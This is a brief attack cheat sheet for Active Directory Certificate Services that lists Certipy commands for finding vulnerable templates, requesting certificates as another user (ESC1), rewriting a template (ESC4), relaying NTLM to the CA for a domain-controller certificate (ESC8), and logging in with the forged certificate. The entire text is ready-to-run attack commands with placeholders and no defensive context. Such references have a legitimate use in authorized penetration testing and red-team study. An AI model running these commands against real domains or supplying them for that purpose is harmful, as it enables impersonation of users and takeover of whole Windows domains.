# ADCS Attacks

## Certipy

### Certipy Find Templates
    certipy find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <TARGET_IP>

### Certipy ESC1 Request Certificate
    certipy req -u <USER>@<DOMAIN> -p '<PASSWORD>' -ca <CA_NAME> -template <TEMPLATE> -upn <TARGET_USER>@<DOMAIN>

### Certipy ESC4 Modify Template
    certipy template -u <USER>@<DOMAIN> -p '<PASSWORD>' -template <TEMPLATE> -save-old

### Certipy ESC8 NTLM Relay
    certipy relay -ca <CA_HOST>.<DOMAIN> -template DomainController

### Certipy Authenticate With Certificate
    certipy auth -pfx <TARGET_USER>.pfx -dc-ip <TARGET_IP>
